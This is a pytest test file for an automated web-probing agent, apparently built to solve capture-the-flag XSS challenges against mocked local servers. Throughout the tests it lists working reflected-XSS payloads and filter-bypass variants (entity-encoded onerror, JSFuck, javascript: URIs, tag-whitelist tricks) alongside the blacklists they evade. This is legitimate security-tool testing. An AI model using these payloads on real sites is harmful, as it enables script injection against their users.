from __future__ import annotations

import json
import re
from urllib.parse import parse_qs, urlencode, urlsplit

from ravage import probe_suite
from ravage.agent_core.agent_state import AgentState
from ravage.deterministic_agents import reflection_value
from ravage.probe_suite import available_probes, run_builtin_probe
from ravage.web_core.http_probe import ProbeResponse

_INLINE_PROOF = "flag{server_verified_dialog_7c1f8a2b}"
_BLACKLIST = ("script", "onload", "onerror", "onclick", "onmouseover", "svg", "'")


class _BaseFakeSession:
    def __init__(self, target_url: str, *, timeout_seconds: int = 10) -> None:
        self.target_url = target_url
        self.origin = "http://127.0.0.1"
        self.timeout_seconds = timeout_seconds

    def absolute(self, value: str) -> str:
        return value if value.startswith("http") else self.origin + value

    def in_scope(self, url: str) -> bool:
        return url.startswith(self.origin)

    def get(self, url: str, *, headers: dict[str, str] | None = None) -> ProbeResponse:
        del headers
        return self.request("GET", url)

    def post_form(self, url: str, fields: dict[str, str], *, headers: dict[str, str] | None = None) -> ProbeResponse:
        del headers
        return self.request("POST", url, data=urlencode(fields).encode("utf-8"))

    def request(self, method: str, url: str, *, data: bytes | None = None, headers: dict[str, str] | None = None) -> ProbeResponse:
        del headers
        fields = {key: values[-1] for key, values in parse_qs(urlsplit(url).query).items()}
        if data:
            fields.update({key: values[-1] for key, values in parse_qs(data.decode("utf-8", "ignore")).items()})
        return self._response(method, url, fields)

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        raise NotImplementedError

    def _page(self, body: str, *, url: str, method: str = "GET") -> ProbeResponse:
        return ProbeResponse(method=method, url=url, status=200, final_url=url, elapsed_ms=5, body=body)

    def _won(self, url: str, method: str) -> ProbeResponse:
        body = f"<div class='solution-text'>Congratulations!<p> Here is the flag: {_INLINE_PROOF}</div>"
        return self._page(body, url=url, method=method)

    def _lost(self, value: str, url: str, method: str) -> ProbeResponse:
        body = f"<div class='solution-text'>Oops! You submitted {value} instead of the expected value</div>"
        return self._page(body, url=url, method=method)


class _DialogTokenSession(_BaseFakeSession):
    """Reflected GET target: proof released only when alert fires with 'XSS'."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("name", "")
        fired = any(f"{call}('XSS')" in value for call in ("alert", "confirm", "prompt"))
        return self._won(url, method) if fired else self._lost(value, url, method)


class _SpaceSvgDialogSession(_BaseFakeSession):
    """Only the normal space-separated SVG event-handler spelling fires."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("name", "")
        fired = "<svg onload=alert('XSS')>" in value
        return self._won(url, method) if fired else self._lost(value, url, method)


class _NumericDialogSession(_BaseFakeSession):
    """Only the conventional alert(1) body-context payload releases proof."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("name", "")
        fired = value == "<svg onload=alert(1)>"
        return self._won(url, method) if fired else self._lost(value, url, method)


class _StyleSlashOnloadSession(_BaseFakeSession):
    """Only a style-tag slash event-handler spelling releases proof."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("name", "")
        fired = value == "<style/onload=alert('XSS')>"
        return self._won(url, method) if fired else self._lost(value, url, method)


class _NoQuoteNoSpaceTokenSession(_BaseFakeSession):
    """Spaces and quotes are filtered, but expression-built XSS token works."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("name", "")
        if " " in value or "'" in value:
            return self._lost(value, url, method)
        fired = value == "<svg/onload=alert(String.fromCharCode(88,83,83))>"
        return self._won(url, method) if fired else self._lost(value, url, method)


class _AlertBlockedConfirmSession(_BaseFakeSession):
    """The sink blocks alert payloads but accepts an equivalent confirm dialog."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("name", "")
        if "alert" in value:
            return self._page(
                "<div class='solution-text'>Sorry you can't use: 'alert'</div>",
                url=url,
                method=method,
            )
        fired = value == "<svg onload=confirm('XSS')>"
        return self._won(url, method) if fired else self._lost(value, url, method)


class _SuccessBlacklistSession(_BaseFakeSession):
    """Token is 'SUCCESS' and common event vectors/single quotes are blocked."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("name", "")
        if any(token in value.lower() for token in _BLACKLIST[:-1]) or "'" in value:
            return self._lost(value, url, method)
        fired = 'alert(`SUCCESS`)' in value or 'alert("SUCCESS")' in value
        return self._won(url, method) if fired else self._lost(value, url, method)


class _EntityParenOnerrorImgSession(_BaseFakeSession):
    """img src sink whose blacklist drops `< > ( ) ` throw javascript`.

    Mirrors the server-side dialog checker: the value is reflected inside
    ``<img src="...">`` and the headless browser releases the proof only when a
    dialog fires with the literal message ``XSS``. Parentheses are blocked
    server-side, so only an HTML-entity / backtick encoded onerror handler that
    the browser decodes before compiling can win.
    """

    _blacklist = ("<", ">", "(", ")", "`", "throw", "javascript")

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("name", "")
        if any(token in value.lower() for token in self._blacklist):
            return self._page(
                "<div class='solution-text'>Sorry you can't use that</div>",
                url=url,
                method=method,
            )
        rendered = (
            value.replace("&#40;", "(")
            .replace("&#41;", ")")
            .replace("&#x28;", "(")
            .replace("&#x29;", ")")
        )
        fired = "onerror=alert('XSS')" in rendered
        return self._won(url, method) if fired else self._lost(value, url, method)


class _QuotedXssLiteralStripInputValueSession(_BaseFakeSession):
    """input value sink that strips only quoted XSS literals before checking."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("name", "")
        cleaned = re.sub(r"""["']XSS["']""", "", value, flags=re.IGNORECASE)
        cleaned = re.sub(r"<script[^>]*>.*?</script>|<script[^>]*>", "", cleaned, flags=re.IGNORECASE | re.DOTALL)
        fired = (
            "onfocus=alert(`XSS`)" in cleaned
            or "onfocus=alert(String.fromCharCode(88,83,83))" in cleaned
        )
        if fired:
            return self._won(url, method)
        body = (
            '<div class="solution-text">Oops! You did an alert with success instead of "XSS"</div>'
            f'<input type=text name=name value="{cleaned}">'
        )
        return self._page(body, url=url, method=method)


class _BodyOnloadTagStripSession(_BaseFakeSession):
    """Strips every ``<tag>`` except ``<body>``; body.onload releases the proof."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("name", "")
        filtered = re.sub(r"<(?!body\b)[^>]+>", "", value, flags=re.IGNORECASE | re.DOTALL)
        fired = "<body onload=alert('XSS')>" in filtered
        return self._won(url, method) if fired else self._lost(value, url, method)


class _ImageOnerrorTagStripSession(_BaseFakeSession):
    """Strips every ``<tag>`` except ``<image>``; the <img> alias fires onerror."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("name", "")
        filtered = re.sub(r"<(?!image\b)[^>]+>", "", value, flags=re.IGNORECASE | re.DOTALL)
        fired = "<image src=x onerror=alert('XSS')>" in filtered
        return self._won(url, method) if fired else self._lost(value, url, method)


def _state_with_context(context: dict[str, object]) -> AgentState:
    state = _state_with_reflected_param()
    payload = {"url": "http://127.0.0.1/page", "input": "name", **context}
    state.signals["xss_contexts"] = [json.dumps(payload, sort_keys=True)]
    return state


def test_img_src_paren_filter_is_bypassed_with_entity_encoded_onerror(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _EntityParenOnerrorImgSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _EntityParenOnerrorImgSession)
    state = _state_with_context(
        {"context": "html_attribute_quoted", "tag_name": "img", "attribute_name": "src", "quote_char": '"'}
    )

    result = _run("http://127.0.0.1/page", state)

    proofs = _proof_findings(result)
    assert proofs, "entity-encoded onerror should bypass the < and ( blacklist"
    assert _INLINE_PROOF in _finding_proofs(proofs[0])
    winner = str(proofs[0]["value"])
    assert "<" not in winner and "(" not in winner and "`" not in winner


def test_raw_reflection_reaches_entity_encoded_onerror_without_context(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _EntityParenOnerrorImgSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _EntityParenOnerrorImgSession)

    result = _run("http://127.0.0.1/page", _state_with_reflected_param())

    proofs = _proof_findings(result)
    assert proofs, "raw reflection should still try the tagless onerror bypass early"
    winner = str(proofs[0]["value"])
    assert _INLINE_PROOF in _finding_proofs(proofs[0])
    assert winner == "x\" onerror=alert&#40;'XSS'&#41; x=\""
    sentinel_values = [
        r["value"] for r in result.requests if r.get("probe_kind") == "reflection_value_xss_sentinel"
    ]
    assert sentinel_values.index(winner) < 8


def test_raw_reflection_uses_expression_focus_when_xss_literal_is_stripped(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _QuotedXssLiteralStripInputValueSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _QuotedXssLiteralStripInputValueSession)

    result = _run("http://127.0.0.1/page", _state_with_reflected_param())

    proofs = _proof_findings(result)
    assert proofs, "raw reflection should avoid quoted XSS literals in attribute breakouts"
    assert _INLINE_PROOF in _finding_proofs(proofs[0])
    assert proofs[0]["value"] == 'x" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="'


def test_attribute_context_xss_sentinel_runs_before_value_gate(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _QuotedXssLiteralStripInputValueSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _QuotedXssLiteralStripInputValueSession)
    state = _state_with_context(
        {"context": "html_attribute_quoted", "tag_name": "input", "attribute_name": "value", "quote_char": '"'}
    )

    result = _run("http://127.0.0.1/page", state)

    proofs = _proof_findings(result)
    assert proofs, "confirmed XSS contexts should be closed before slow generic value-gate probes"
    assert proofs[0]["value"] == '" autofocus onfocus=alert(`XSS`) x="'
    kinds = [r.get("probe_kind") for r in result.requests]
    sentinel_index = kinds.index("reflection_value_xss_sentinel")
    dialog_index = kinds.index("reflection_value_dialog") if "reflection_value_dialog" in kinds else len(kinds)
    assert sentinel_index < dialog_index


def test_body_onload_is_captured_when_only_body_tag_survives(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _BodyOnloadTagStripSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _BodyOnloadTagStripSession)
    state = _state_with_context({"context": "html_body", "tag_name": ""})

    result = _run("http://127.0.0.1/page", state)

    proofs = _proof_findings(result)
    assert proofs, "body onload should win when the filter strips every tag except <body>"
    assert _INLINE_PROOF in _finding_proofs(proofs[0])
    assert proofs[0]["value"] == "<body onload=alert('XSS')>"


def test_image_onerror_is_captured_when_only_image_tag_survives(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _ImageOnerrorTagStripSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _ImageOnerrorTagStripSession)
    state = _state_with_context({"context": "html_body", "tag_name": ""})

    result = _run("http://127.0.0.1/page", state)

    proofs = _proof_findings(result)
    assert proofs, "the <image> alias should win when the filter strips every tag except <image>"
    assert _INLINE_PROOF in _finding_proofs(proofs[0])
    assert proofs[0]["value"] == "<image src=x onerror=alert('XSS')>"


class _PostFormDialogSession(_BaseFakeSession):
    """Payload comes from request.form and only POST counts."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        if method != "POST":
            return self._lost("(GET ignored)", url, method)
        value = fields.get("solution", "")
        fired = any(f"{call}('XSS')" in value for call in ("alert", "confirm", "prompt"))
        return self._won(url, method) if fired else self._lost(value, url, method)


class _JsStringBreakoutSession(_BaseFakeSession):
    """Only a JavaScript double-string breakout releases proof."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("name", "")
        return self._won(url, method) if value == "\";alert('XSS');//" else self._lost(value, url, method)


class _PostFormShadowedByQuerySession(_BaseFakeSession):
    """GET reflection exists, but proof is released only by the POST form."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("solution", "")
        if method == "POST" and value == "\";alert('XSS');//":
            return self._won(url, method)
        return self._lost(value, url, method)


class _BenignReflectionSession(_BaseFakeSession):
    """Reflects the value but never releases a proof (no server-side check)."""

    def _response(self, method: str, url: str, fields: dict[str, str]) -> ProbeResponse:
        value = fields.get("name", "")
        return self._page(f"<html><body>Hello {value}, welcome.</body></html>", url=url, method=method)


def _state_with_reflected_param() -> AgentState:
    state = AgentState()
    state.surface = {
        "target_url": "http://127.0.0.1/page",
        "origin": "http://127.0.0.1",
        "parameters": [
            {
                "name": "name",
                "locations": ["http://127.0.0.1/page?name=ravage"],
                "hints": ["reflected"],
                "priority": 80,
            }
        ],
        "forms": [],
        "endpoints": [{"url": "http://127.0.0.1/page?name=ravage", "hints": ["page"]}],
        "reflections": [{"name": "name", "url": "http://127.0.0.1/page"}],
    }
    state.signals = {"reflections": ["name reflected"]}
    return state


def _state_with_post_form() -> AgentState:
    state = AgentState()
    state.surface = {
        "target_url": "http://127.0.0.1/page",
        "origin": "http://127.0.0.1",
        "parameters": [],
        "forms": [
            {
                "id": "f1",
                "action": "http://127.0.0.1/page",
                "method": "POST",
                "inputs": [{"name": "solution", "type": "text"}],
            }
        ],
        "endpoints": [{"url": "http://127.0.0.1/page", "hints": ["page"]}],
        "reflections": [{"name": "solution", "url": "http://127.0.0.1/page"}],
    }
    state.signals = {"reflections": ["solution reflected"]}
    return state


def _run(target_url: str, state: AgentState):
    return run_builtin_probe("reflection_value_boundary", target_url=target_url, state=state)


def _proof_findings(result) -> list[dict[str, object]]:
    return [f for f in result.findings if f["type"] == "reflection_value_proof"]


def _finding_proofs(finding: dict[str, object]) -> list[str]:
    value = finding.get("proofs")
    assert isinstance(value, list)
    proofs: list[str] = []
    for proof in value:
        assert isinstance(proof, str)
        proofs.append(proof)
    return proofs


def _mapping_value(item: dict[str, object], key: str) -> dict[str, object]:
    value = item.get(key)
    assert isinstance(value, dict)
    return value


def test_reflection_value_boundary_is_an_available_probe() -> None:
    assert "reflection_value_boundary" in {item["name"] for item in available_probes()}


def test_reflected_xss_sentinel_captures_inline_proof(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _DialogTokenSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _DialogTokenSession)

    result = _run("http://127.0.0.1/page", _state_with_reflected_param())

    proofs = _proof_findings(result)
    assert proofs, "expected a reflection_value_proof finding from the XSS sentinel"
    assert _INLINE_PROOF in _finding_proofs(proofs[0])
    assert "prompt('XSS')" in str(proofs[0]["value"])
    assert any(r.get("probe_kind") == "reflection_value_xss_sentinel" for r in result.requests)


def test_reflection_value_uses_xss_context_without_surface_inventory(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _DialogTokenSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _DialogTokenSession)
    state = AgentState()
    state.signals["xss_contexts"] = [
        json.dumps(
            {
                "url": "http://127.0.0.1/page",
                "input": "name",
                "context": "html_body",
            },
            sort_keys=True,
        )
    ]

    result = _run("http://127.0.0.1/page", state)

    proofs = _proof_findings(result)
    assert proofs, "expected context-only reflection evidence to drive the closer"
    assert any(
        _mapping_value(request, "target")["input"] == "name"
        for request in result.requests
        if request.get("probe_kind") == "reflection_value_xss_sentinel"
    )


def test_html_body_context_tries_space_separated_svg_sentinel(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _SpaceSvgDialogSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _SpaceSvgDialogSession)
    state = _state_with_reflected_param()
    state.signals["xss_contexts"] = [
        json.dumps(
            {
                "url": "http://127.0.0.1/page",
                "input": "name",
                "context": "html_body",
                "tag_name": "body",
            },
            sort_keys=True,
        )
    ]

    result = _run("http://127.0.0.1/page", state)

    proofs = _proof_findings(result)
    assert proofs, "expected the space-separated SVG sentinel to win"
    assert _INLINE_PROOF in _finding_proofs(proofs[0])
    sentinel_requests = [r for r in result.requests if r.get("probe_kind") == "reflection_value_xss_sentinel"]
    assert sentinel_requests[0]["value"] == "<svg onload=alert('XSS')>"


def test_html_body_context_tries_numeric_dialog_fallback(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _NumericDialogSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _NumericDialogSession)
    state = _state_with_reflected_param()
    state.signals["xss_contexts"] = [
        json.dumps(
            {
                "url": "http://127.0.0.1/page",
                "input": "name",
                "context": "html_body",
                "tag_name": "body",
            },
            sort_keys=True,
        )
    ]

    result = _run("http://127.0.0.1/page", state)

    proofs = _proof_findings(result)
    assert proofs, "expected the alert(1) body-context sentinel to win"
    assert _INLINE_PROOF in _finding_proofs(proofs[0])
    assert proofs[0]["value"] == "<svg onload=alert(1)>"
    sentinel_values = [
        r["value"] for r in result.requests if r.get("probe_kind") == "reflection_value_xss_sentinel"
    ]
    assert sentinel_values[0] == "<svg onload=alert('XSS')>"
    assert "<svg onload=alert(1)>" in sentinel_values[:20]


def test_html_body_context_tries_style_slash_onload_sentinel(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _StyleSlashOnloadSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _StyleSlashOnloadSession)
    state = _state_with_reflected_param()
    state.signals["xss_contexts"] = [
        json.dumps(
            {
                "url": "http://127.0.0.1/page",
                "input": "name",
                "context": "html_body",
                "tag_name": "body",
            },
            sort_keys=True,
        )
    ]

    result = _run("http://127.0.0.1/page", state)

    proofs = _proof_findings(result)
    assert proofs, "expected the style/onload sentinel to win"
    assert _INLINE_PROOF in _finding_proofs(proofs[0])
    assert proofs[0]["value"] == "<style/onload=alert('XSS')>"
    sentinel_values = [
        r["value"] for r in result.requests if r.get("probe_kind") == "reflection_value_xss_sentinel"
    ]
    assert sentinel_values.index("<style/onload=alert('XSS')>") < 4


def test_html_body_context_tries_quote_free_token_expression(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _NoQuoteNoSpaceTokenSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _NoQuoteNoSpaceTokenSession)
    state = _state_with_reflected_param()
    state.signals["xss_contexts"] = [
        json.dumps(
            {
                "url": "http://127.0.0.1/page",
                "input": "name",
                "context": "html_body",
                "tag_name": "body",
            },
            sort_keys=True,
        )
    ]

    result = _run("http://127.0.0.1/page", state)

    proofs = _proof_findings(result)
    assert proofs, "expected the quote-free token-expression sentinel to win"
    assert _INLINE_PROOF in _finding_proofs(proofs[0])
    assert proofs[0]["value"] == "<svg/onload=alert(String.fromCharCode(88,83,83))>"
    assert " " not in str(proofs[0]["value"])
    assert "'" not in str(proofs[0]["value"])


def test_alert_filtered_context_tries_confirm_dialog(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _AlertBlockedConfirmSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _AlertBlockedConfirmSession)
    state = _state_with_reflected_param()
    state.signals["xss_contexts"] = [
        json.dumps(
            {
                "url": "http://127.0.0.1/page",
                "input": "name",
                "context": "html_body",
                "tag_name": "body",
            },
            sort_keys=True,
        )
    ]

    result = _run("http://127.0.0.1/page", state)

    proofs = _proof_findings(result)
    assert proofs, "expected confirm fallback to win when alert is filtered"
    assert result.findings[0]["type"] == "reflection_value_proof"
    assert _INLINE_PROOF in _finding_proofs(proofs[0])
    assert proofs[0]["value"] == "<svg onload=confirm('XSS')>"


def test_success_token_with_blacklist_is_captured(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _SuccessBlacklistSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _SuccessBlacklistSession)

    result = _run("http://127.0.0.1/page", _state_with_reflected_param())

    proofs = _proof_findings(result)
    assert proofs, "expected the SUCCESS-token / blacklist-evading sentinel to win"
    assert _INLINE_PROOF in _finding_proofs(proofs[0])
    assert "SUCCESS" in str(proofs[0]["value"])


def test_post_form_xss_sentinel_is_captured(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _PostFormDialogSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _PostFormDialogSession)

    result = _run("http://127.0.0.1/page", _state_with_post_form())

    proofs = _proof_findings(result)
    assert proofs, "expected a POST-form reflected-XSS sentinel to win"
    assert _INLINE_PROOF in _finding_proofs(proofs[0])
    assert _mapping_value(proofs[0], "replay")["method"] == "POST"


def test_js_string_context_prioritizes_breakout_payload(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _JsStringBreakoutSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _JsStringBreakoutSession)
    state = _state_with_reflected_param()
    state.signals["xss_contexts"] = [
        json.dumps(
            {
                "url": "http://127.0.0.1/page",
                "input": "name",
                "context": "js_string_double",
                "tag_name": "script",
                "quote_char": '"',
            },
            sort_keys=True,
        )
    ]

    result = _run("http://127.0.0.1/page", state)

    proofs = _proof_findings(result)
    assert proofs, "expected the context-specific JS-string breakout to win"
    sentinel_requests = [r for r in result.requests if r.get("probe_kind") == "reflection_value_xss_sentinel"]
    assert sentinel_requests[0]["value"] == "\";alert('XSS');//"


def test_js_string_context_offers_jsfuck_for_alnum_angle_blacklists() -> None:
    payloads = reflection_value._xss_sentinel_payloads(
        [
            {
                "url": "http://127.0.0.1/page",
                "input": "name",
                "context": "js_string_double",
                "tag_name": "script",
                "quote_char": '"',
            }
        ],
        input_name="name",
    )

    jsfuck = next(value for value in payloads if value.startswith('";[]['))
    assert payloads.index(jsfuck) < 6
    assert re.search(r"[A-Za-z0-9<>]", jsfuck) is None


def test_raw_reflection_prioritizes_quoted_prompt_breakout() -> None:
    payloads = reflection_value._xss_sentinel_payloads(input_name="name")

    assert payloads[0] == "\"><svg onload=prompt('XSS')>"
    assert payloads.index("\"><svg onload=prompt('XSS')>") < payloads.index("<svg onload=alert('XSS')>")
    jsfuck = next(value for value in payloads if value.startswith('";[]['))
    assert payloads.index(jsfuck) < 16
    assert re.search(r"[A-Za-z0-9<>]", jsfuck) is None


def test_attribute_context_prioritizes_attribute_breakout() -> None:
    payloads = reflection_value._xss_sentinel_payloads(
        [
            {
                "url": "http://127.0.0.1/page",
                "input": "name",
                "context": "html_attribute_quoted",
                "tag_name": "input",
                "attribute_name": "value",
                "quote_char": '"',
            }
        ]
    )

    assert payloads[0] == '" autofocus onfocus=alert(`XSS`) x="'
    assert not payloads[0].startswith('";alert')


def test_quoted_src_attribute_prioritizes_attribute_breakout_over_url_scheme() -> None:
    payloads = reflection_value._xss_sentinel_payloads(
        [
            {
                "url": "http://127.0.0.1/page",
                "input": "name",
                "context": "html_attribute_quoted",
                "tag_name": "img",
                "attribute_name": "src",
                "quote_char": '"',
            }
        ]
    )

    assert payloads[0] == "x\" onerror=alert&#40;'XSS'&#41; x=\""
    assert "<" not in payloads[0] and "(" not in payloads[0] and "`" not in payloads[0]
    assert not any(payload.startswith("javascript:") for payload in payloads[:4])
    assert "\"><svg onload=alert('XSS')>" in payloads


def test_url_named_iframe_src_prioritizes_javascript_dialog_uri() -> None:
    payloads = reflection_value._xss_sentinel_payloads(
        [
            {
                "url": "http://127.0.0.1/page",
                "input": "url",
                "context": "html_attribute_quoted",
                "tag_name": "iframe",
                "attribute_name": "src",
                "quote_char": '"',
            }
        ],
        input_name="url",
    )

    assert payloads[0] == "javascript:prompt('XSS')"
    assert payloads.index("javascript:prompt('XSS')") < payloads.index("x\" onerror=alert&#40;'XSS'&#41; x=\"")


def test_quoted_src_attribute_offers_backtick_and_hex_entity_onerror_variants() -> None:
    payloads = reflection_value._xss_sentinel_payloads(
        [
            {
                "url": "http://127.0.0.1/page",
                "input": "name",
                "context": "html_attribute_quoted",
                "tag_name": "img",
                "attribute_name": "src",
                "quote_char": '"',
            }
        ]
    )

    assert "x\" onerror=alert&#x28;'XSS'&#x29; x=\"" in payloads
    assert "x\" onerror=alert`XSS` x=\"" in payloads


def test_html_body_context_offers_body_onload_for_tag_whitelist_filters() -> None:
    payloads = reflection_value._xss_sentinel_payloads(
        [
            {
                "url": "http://127.0.0.1/page",
                "input": "name",
                "context": "html_body",
                "tag_name": "",
            }
        ]
    )

    assert "<body onload=alert('XSS')>" in payloads
    assert payloads.index("<body onload=alert('XSS')>") < 4


def test_post_form_is_tried_when_query_target_shares_input_name(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _PostFormShadowedByQuerySession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _PostFormShadowedByQuerySession)
    state = _state_with_post_form()
    state.surface["parameters"] = [
        {
            "name": "solution",
            "locations": ["http://127.0.0.1/page?solution=ravage"],
            "priority": 80,
        }
    ]
    state.signals["xss_contexts"] = [
        json.dumps(
            {
                "url": "http://127.0.0.1/page",
                "input": "solution",
                "context": "js_string_double",
                "tag_name": "script",
                "quote_char": '"',
            },
            sort_keys=True,
        )
    ]

    result = _run("http://127.0.0.1/page", state)

    proofs = _proof_findings(result)
    assert proofs, "expected POST form to be exercised even with a same-name query target"
    assert _mapping_value(proofs[0], "replay")["method"] == "POST"
    sentinel_requests = [r for r in result.requests if r.get("probe_kind") == "reflection_value_xss_sentinel"]
    assert _mapping_value(sentinel_requests[0], "target")["method"] == "POST"


def test_benign_reflection_does_not_fabricate_a_proof(monkeypatch) -> None:
    monkeypatch.setattr(probe_suite, "ProbeSession", _BenignReflectionSession)
    monkeypatch.setattr(reflection_value, "ProbeSession", _BenignReflectionSession)

    result = _run("http://127.0.0.1/page", _state_with_reflected_param())

    assert not _proof_findings(result)
